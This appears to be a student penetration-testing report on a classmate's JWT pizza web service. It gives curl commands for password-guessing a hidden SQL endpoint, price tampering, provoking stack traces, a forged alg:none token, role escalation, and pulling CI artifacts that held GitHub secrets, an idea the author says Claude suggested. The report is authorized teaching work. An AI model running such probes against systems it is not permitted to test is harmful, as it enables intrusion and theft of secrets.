<h1> Self attacks </h1>
<h2> DJ Sproul </h2>
<h3> Attempt #1: </h3>
<p><strong>Vulnerability:</strong> SQL injection in update user</p>
<p><strong>Severity:</strong> moderate. Could inject, but SQL got flattened and couldn't do anything useful</p>
<p><strong>Fix:</strong> Parameterized database.js updateUser function to further flatten any potential injections</p>
<h3> Attempt #2: </h3> 
<p><strong>Vulnerability:</strong> Able to get access to pretty much everything via curl with the default admin</p>
<p><strong>Severity:</strong> critical</p>
<p><strong>Fix:</strong> Removed default admin creation from DB intialization</p>
<h3> Attempt #3: </h3>
<p><strong>Vulnerability:</strong> No rate limiting, so passwords can be brute forced</p>
<p><strong>Severity:</strong> moderate</p>
<p><strong>Fix:</strong> Added rate limiter middleware</p>
<h3> Attempt #4: </h3>
<p><strong>Vulnerability:</strong> Able to order pizza for $0 through curl request</p>
<p><strong>Severity:</strong> critical</p>
<p><strong>Fix:</strong> Check order price against saved pizza price before confirming</p>
<h3> Attempt #5: </h3>
<p><strong>Vulnerability:</strong> Able to see stack trace through intentionally sending requests that error</p>
<p><strong>Severity:</strong> ? couldn't figure out how it was useful</p>
<p><strong>Fix:</strong> only print the stack trace in dev</p>
<h2> Than Gerlek </h2>

<h1> Peer attacks </h1>
<h2> DJ Sproul</h2> 
<h3>Attempt #1</h3>
<p>Uncovered existence of <code>/lol</code> endpoint in peer's repo. Created a diner account through curl:</p>
<pre><code>curl -s -X POST https://pizza-service.gerleksgarage.click/api/auth \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@test.com","password":"password123"}'</code></pre>

<p>Ordered pizza, attempted to set price to $0.00 (did not work — server enforces real menu price):</p>
<pre><code># Use token returned by POST
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGFja2VyIiwiZW1haWwiOiJoYWNrZXJAdGVzdC5jb20iLCJyb2xlcyI6W3sicm9sZSI6ImRpbmVyIn1dLCJpZCI6MTMsImlhdCI6MTc3NTg1NzY5Nn0.4_wP6PdHraRINgrk2P125cboHYFyPdz4zTLP7vtfj1I"

curl -s https://pizza-service.gerleksgarage.click/api/order/menu

curl -s -X POST https://pizza-service.gerleksgarage.click/api/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":1,"description":"Veggie","price":0.00}]}'</code></pre>

<p>Pizza order returned a signed JWT which decoded to reveal the vendor's internal ID and name:</p>
<pre><code>ID: ng322
Name: Nathaniel Gerlek</code></pre>

<p>Attempted to use the net ID and variations as the password for the <code>/lol</code> endpoint (did not work):</p>
<pre><code>for pw in "ng322" "Ng322" "NG322" "nathaniel" "gerlek" "nathanielgerlek" "NathanielGerlek"; do
  echo -n "$pw: "
  curl -s -X POST https://pizza-service.gerleksgarage.click/api/auth/lol \
    -H "Content-Type: application/json" \
    -d "{\"pw\":\"$pw\",\"query\":\"SELECT 1\"}"
  echo ""
done</code></pre>

<p><strong>Vulnerability found:</strong> Hidden debug endpoint <code>POST /api/auth/lol</code> exists in production. Accepts a password and executes arbitrary SQL. Unexploitable without the password.</p>
<p><strong>Severity:</strong> Critical to brute force</p>

<h3>Attempt #2</h3>
<p>Attempted to create a store under a non-existent franchise (ID 999) to trigger an error:</p>
<pre><code>curl -s -X POST https://pizza-service.gerleksgarage.click/api/franchise/999/store \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test"}'</code></pre>

<p>Full stack trace was returned in the response:</p>
<pre><code>{"message":"unable to create a store","stack":"Error: unable to create a store\n    at /usr/src/app/routes/franchiseRouter.js:152:15\n    at process.processTicksAndRejections (node:internal/process/task_queues:103:5)"}</code></pre>

<p>Further probed by sending malformed franchise IDs to trigger DB-level errors:</p>
<pre><code>curl -s -X DELETE https://pizza-service.gerleksgarage.click/api/franchise/null \
  -H "Authorization: Bearer $TOKEN"

curl -s -X POST https://pizza-service.gerleksgarage.click/api/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":"null","storeId":"null","items":[{"menuId":"null","description":"test","price":0.05}]}'</code></pre>

<p>DB-level stack traces bubbled up, exposing internal file paths, line numbers, and architecture details:</p>
<pre><code>{"message":"unknown menu item","stack":"Error: unknown menu item\n    at DB.addDinerOrder (/usr/src/app/database/database.js:271:17)\n    at process.processTicksAndRejections (node:internal/process/task_queues:103:5)\n    at async /usr/src/app/routes/orderRouter.js:127:21"}</code></pre>

<p><strong>Vulnerability found:</strong> Error messages expose full stack traces. Not useful since I have the repo, but would be useful to someone who doesn't.</p>
<p><strong>Severity:</strong> Moderate</p>

<h3>Attempt #3</h3>
<p>Attempted JWT algorithm confusion attack (<code>alg:none</code>). Crafted a forged token with no signature claiming admin role:</p>
<pre><code>curl -s -X DELETE https://pizza-service.gerleksgarage.click/api/franchise/1 \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwiZW1haWwiOiJhQGp3dC5jb20iLCJyb2xlcyI6W3sicm9sZSI6ImFkbWluIn1dLCJpYXQiOjE3NzU4NTc2OTZ9."</code></pre>

<p>Server correctly returned <code>401 unauthorized</code>. The <code>jwt.verify</code> call explicitly pins the algorithm to <code>HS256</code>, rejecting any token with a different algorithm including <code>none</code>.</p>
<p><strong>Vulnerability found:</strong> None — properly mitigated.</p>
<p><strong>Severity:</strong> N/A</p>

<h3> Attempt #4: </h3>
<p> Attempted to register new user with admin role</p>
<pre><code>curl -s -X POST https://pizza-service.gerleksgarage.click/api/auth \ 
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker4@test.com","password":"password123","roles":[{"role":"admin"}]}'
{"user":{"name":"hacker","email":"hacker4@test.com","roles":[{"role":"diner"}],"id":14},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGFja2VyIiwiZW1haWwiOiJoYWNrZXI0QHRlc3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJkaW5lciJ9XSwiaWQiOjE0LCJpYXQiOjE3NzU4NTk5MjB9.CTY7O0VUYHMvCA5UdrFsLReZCgdaJ9p2Jq0mOBPQ7kg"}%  </code></pre>
<p>Decoding the JWT token that the server returned revealed that the role of the new user was still diner, as expected but as I hoped not. </p>
<p><strong>Vulnerability found:</strong> None - properly mitigated</p>
<p><strong>Severity:</strong> N/A</p>

<h3> Attempt #5: </h3>
<p> Asked Claude and enabled extended thought for this one -- it suggested that I might be able to grab Than's repo's artifacts with a public repo token. </p>
<pre><code>curl -s https://api.github.com/repos/ThanGerlek/jwt-pizza-service/actions/artifacts</code></pre>
<p> They were there, so I downloaded them with a public repo token:</p>
<pre><code>curl -L -o package.zip \                     
  "https://api.github.com/repos/ThanGerlek/jwt-pizza-service/actions/artifacts/6364609687/zip" \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer [TOKEN]"

unzip package.zip -d package/
cat package/config.js </code></pre>
<p> I won't paste the response because it contained all of his GitHub secrets. Seems like something GitHub really should fix -- I'm not sure why that's even allowed at all. </p>
<p><strong>Vulnerability found:</strong> CI/CD secret exposure through public curl request </p>
<p><strong>Severity:</strong> Critical</p>

<h2> Than Gerlek </h2>


<h2> Summary of Findings </h2>

